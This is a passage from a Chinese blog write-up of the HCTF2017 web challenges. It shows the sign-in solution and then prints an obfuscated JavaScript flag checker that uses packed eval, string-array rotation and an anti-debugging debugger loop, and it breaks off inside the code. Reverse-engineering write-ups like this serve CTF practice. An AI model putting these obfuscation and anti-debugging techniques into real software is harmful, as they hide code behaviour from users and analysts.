<!DOCTYPE html>
<html lang="zh">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <link rel="stylesheet" href="//unpkg.com/heti/umd/heti.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@500&family=Roboto+Serif:opsz,wght@8..144,100&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        梅子酒の笔记本
    </title>
    <link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css">
<link rel="alternate" href="/atom.xml" title="梅子酒の笔记本" type="application/atom+xml">
</head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            HCTF2017 Web Writeup
        </p>
        <hr>
    </div>
    <div class="post-content heti">
        <h1 id="hctf2017-web部分题解"><a class="markdownIt-Anchor" href="#hctf2017-web部分题解"></a> HCTF2017 Web部分题解</h1>
<blockquote>
<p>这次比赛感觉有点憋屈，上来起手怼了个偏逆向的JS，差不多耗了一整天的时间，吸取教训，多练练逆向吧</p>
</blockquote>
<h2 id="0签到"><a class="markdownIt-Anchor" href="#0签到"></a> 0.签到</h2>
<p>打开发现证书有问题</p>
<p>火狐打开，然后查看证书，base64解码，拿到ip，访问拿到flag</p>
<h2 id="1js逆向"><a class="markdownIt-Anchor" href="#1js逆向"></a> 1.JS逆向</h2>
<p>以下部分为源代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">'random'</span>, <span class="string">'charCodeAt'</span>, <span class="string">'fromCharCode'</span>, <span class="string">'parse'</span>, <span class="string">'substr'</span>, <span class="string">'\x5cw+'</span>, <span class="string">'replace'</span>, <span class="string">'(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125; &#125;)()&#125;)();'</span>, <span class="string">'||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20'</span>, <span class="string">'pop'</span>, <span class="string">'length'</span>, <span class="string">'join'</span>, <span class="string">'getElementById'</span>, <span class="string">'message'</span>, <span class="string">'log'</span>, <span class="string">'Welcome\x20to\x20HCTF:&gt;'</span>, <span class="string">'Congratulations!\x20you\x20got\x20it!'</span>, <span class="string">'Sorry,\x20you\x20are\x20wrong...'</span>, <span class="string">'window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)'</span>, <span class="string">'version'</span>, <span class="string">'error'</span>, <span class="string">'download'</span>, <span class="string">'substring'</span>, <span class="string">'push'</span>, <span class="string">'Function'</span>, <span class="string">'charAt'</span>, <span class="string">'idle'</span>, <span class="string">'pyW5F1U43VI'</span>, <span class="string">'init'</span>, <span class="string">'https://the-extension.com'</span>, <span class="string">'local'</span>, <span class="string">'storage'</span>, <span class="string">'eval'</span>, <span class="string">'then'</span>, <span class="string">'get'</span>, <span class="string">'getTime'</span>, <span class="string">'setUTCHours'</span>, <span class="string">'origin'</span>, <span class="string">'set'</span>, <span class="string">'GET'</span>, <span class="string">'loading'</span>, <span class="string">'status'</span>, <span class="string">'removeListener'</span>, <span class="string">'onUpdated'</span>, <span class="string">'callee'</span>, <span class="string">'addListener'</span>, <span class="string">'onMessage'</span>, <span class="string">'runtime'</span>, <span class="string">'executeScript'</span>, <span class="string">'data'</span>, <span class="string">'test'</span>, <span class="string">'http://'</span>, <span class="string">'Url\x20error'</span>, <span class="string">'query'</span>, <span class="string">'filter'</span>, <span class="string">'active'</span>, <span class="string">'floor'</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x1661d3</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">'push'</span>](_0xd4b7d6[<span class="string">'shift'</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5e3956(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) </span>&#123;</span><br><span class="line">    _0x5c351c = _0x5c351c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> _0x26f3b3 = _0x180a[_0x5c351c];</span><br><span class="line">    <span class="keyword">return</span> _0x26f3b3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">_0x5b7c0c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">'code'</span>, _0xa180(<span class="string">'0x0'</span>), _0xa180(<span class="string">'0x1'</span>), _0xa180(<span class="string">'0x2'</span>), <span class="string">'invalidMonetizationCode'</span>, _0xa180(<span class="string">'0x3'</span>), _0xa180(<span class="string">'0x4'</span>), _0xa180(<span class="string">'0x5'</span>), _0xa180(<span class="string">'0x6'</span>), _0xa180(<span class="string">'0x7'</span>), _0xa180(<span class="string">'0x8'</span>), _0xa180(<span class="string">'0x9'</span>), _0xa180(<span class="string">'0xa'</span>), _0xa180(<span class="string">'0xb'</span>), _0xa180(<span class="string">'0xc'</span>), _0xa180(<span class="string">'0xd'</span>), _0xa180(<span class="string">'0xe'</span>), _0xa180(<span class="string">'0xf'</span>), _0xa180(<span class="string">'0x10'</span>), _0xa180(<span class="string">'0x11'</span>), <span class="string">'url'</span>, _0xa180(<span class="string">'0x12'</span>), _0xa180(<span class="string">'0x13'</span>), _0xa180(<span class="string">'0x14'</span>), _0xa180(<span class="string">'0x15'</span>), _0xa180(<span class="string">'0x16'</span>), _0xa180(<span class="string">'0x17'</span>), _0xa180(<span class="string">'0x18'</span>), <span class="string">'tabs'</span>, _0xa180(<span class="string">'0x19'</span>), _0xa180(<span class="string">'0x1a'</span>), _0xa180(<span class="string">'0x1b'</span>), _0xa180(<span class="string">'0x1c'</span>), _0xa180(<span class="string">'0x1d'</span>), <span class="string">'replace'</span>, _0xa180(<span class="string">'0x1e'</span>), _0xa180(<span class="string">'0x1f'</span>), <span class="string">'includes'</span>, _0xa180(<span class="string">'0x20'</span>), <span class="string">'length'</span>, _0xa180(<span class="string">'0x21'</span>), _0xa180(<span class="string">'0x22'</span>), _0xa180(<span class="string">'0x23'</span>), _0xa180(<span class="string">'0x24'</span>), _0xa180(<span class="string">'0x25'</span>), _0xa180(<span class="string">'0x26'</span>), _0xa180(<span class="string">'0x27'</span>), _0xa180(<span class="string">'0x28'</span>), _0xa180(<span class="string">'0x29'</span>), <span class="string">'toString'</span>, _0xa180(<span class="string">'0x2a'</span>), <span class="string">'split'</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = _0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(btoa(_0x50559f), <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span> (<span class="params">_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2</span>) </span>&#123;</span><br><span class="line">            _0x2d59cf = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4be75f</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> _0x4be75f[<span class="string">'toString'</span>](_0x177f13);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">''</span> [<span class="string">'replace'</span>](<span class="regexp">/^/</span>, <span class="built_in">String</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);</span><br><span class="line">                _0x802d91 = [</span><br><span class="line">                    <span class="function"><span class="keyword">function</span> (<span class="params">_0x5e8f1a</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> _0x2829f2[_0x5e8f1a];</span><br><span class="line">                    &#125;</span><br><span class="line">                ];</span><br><span class="line">                _0x2d59cf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> _0xa180(<span class="string">'0x2b'</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                _0x46da6f = <span class="number">0x1</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">while</span> (_0x46da6f--)</span><br><span class="line">                <span class="keyword">if</span> (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180(<span class="string">'0x2c'</span>)](<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\x5cb'</span> + _0x2d59cf(_0x46da6f) + <span class="string">'\x5cb'</span>, <span class="string">'g'</span>), _0x802d91[_0x46da6f]);</span><br><span class="line">            <span class="keyword">return</span> _0x200db2;</span><br><span class="line">        &#125;(_0xa180(<span class="string">'0x2d'</span>), <span class="number">0x11</span>, <span class="number">0x11</span>, _0xa180(<span class="string">'0x2e'</span>)[<span class="string">'split'</span>](<span class="string">'|'</span>), <span class="number">0x0</span>, &#123;&#125;));</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3aba26</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[_0xa180(<span class="string">'0x4'</span>)](_0x3291b7[<span class="string">'shift'</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            _0xaed809(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3120e0</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3120e0 = <span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x3a882f = _0x2e2f8d[_0x3120e0];</span><br><span class="line">            <span class="keyword">return</span> _0x3a882f;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x1c3854 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x52ba71</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x52b956 = <span class="string">'0x'</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x59c050 = <span class="number">0x0</span>; _0x59c050 &lt; _0x52ba71[_0x43c8d1(<span class="number">0x8</span>)]; _0x59c050++) &#123;</span><br><span class="line">                _0x52b956 += _0x52ba71[_0x43c8d1(<span class="string">'f'</span>)](_0x59c050)[_0x43c8d1(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x52b956;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x76e1e8 = _0x5b7c0c[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">'_'</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x34f55b = (_0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x2</span>)) ^ _0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>))) % _0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] == <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">if</span> (!_0x34f55b) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        b2c = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="built_in">Math</span>[_0xa180(<span class="string">'0x25'</span>)](_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">''</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">'1d'</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">'1d'</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">'1d'</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">'1d'</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | _0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">'1d'</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">'1d'</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">'1d'</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">'1d'</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">'f'</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0xa180(<span class="string">'0x2f'</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0x43c8d1(<span class="string">'1b'</span>)](<span class="string">'='</span>);</span><br><span class="line">            (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                (<span class="function"><span class="keyword">function</span> <span class="title">_0x3c3bd8</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        (<span class="function"><span class="keyword">function</span> <span class="title">_0x4dc510</span>(<span class="params">_0x460a91</span>) </span>&#123;</span><br><span class="line">                            <span class="keyword">if</span> ((<span class="string">''</span> + _0x460a91 / _0x460a91)[_0xa180(<span class="string">'0x30'</span>)] !== <span class="number">0x1</span> || _0x460a91 % <span class="number">0x14</span> === <span class="number">0x0</span>) &#123;</span><br><span class="line">                                (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;[<span class="string">'constructor'</span>](<span class="string">'debugger'</span>)());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">debugger</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            _0x4dc510(++_0x460a91);</span><br><span class="line">                        &#125;(<span class="number">0x0</span>));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (_0x30f185) &#123;</span><br><span class="line">                        setTimeout(_0x3c3bd8, <span class="number">0x1388</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;());</span><br><span class="line">            &#125;());</span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[_0xa180(<span class="string">'0x31'</span>)](<span class="string">''</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        e = _0x1c3854(b2c(_0x76e1e8[<span class="number">0x2</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">'='</span>)[<span class="number">0x0</span>]) ^ <span class="number">0x53a3f32</span>;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        f = _0x1c3854(b2c(_0x76e1e8[<span class="number">0x3</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">'='</span>)[<span class="number">0x0</span>]) ^ e;</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        n = f * e * _0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        h = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4c466e, _0x28871</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3ea581 = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x2fbf7a = <span class="number">0x0</span>; _0x2fbf7a &lt; _0x4c466e[_0x43c8d1(<span class="number">0x8</span>)]; _0x2fbf7a++) &#123;</span><br><span class="line">                _0x3ea581 += _0x28871(_0x4c466e[_0x2fbf7a]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x3ea581;</span><br><span class="line">        &#125;;</span><br><span class="line">        j = _0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0xe</span>)](<span class="string">'3'</span>);</span><br><span class="line">        <span class="keyword">if</span> (j[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)] || (_0x1c3854(j[<span class="number">0x0</span>]) ^ _0x1c3854(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        k = <span class="function"><span class="params">_0xffcc52</span> =&gt;</span> _0xffcc52[_0x43c8d1(<span class="string">'f'</span>)]() * _0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        l = h(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="keyword">if</span> (l != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        m = _0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % l;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x5a6d56</span>(<span class="params">_0x5a25ab, _0x4a4483</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x55b09f = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x508ace = <span class="number">0x0</span>; _0x508ace &lt; _0x4a4483; _0x508ace++) &#123;</span><br><span class="line">                _0x55b09f += _0x5a25ab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x55b09f;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!m || _0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x5</span>, <span class="number">0x4</span>) || _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x1</span>) - _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        o = _0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>))[_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)[_0x43c8d1(<span class="string">'f'</span>)]() * _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0x8</span>)] * <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">return</span> o &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span> &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>) == _0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x4cbb89) &#123;</span><br><span class="line">        <span class="built_in">console</span>[<span class="string">'log'</span>](<span 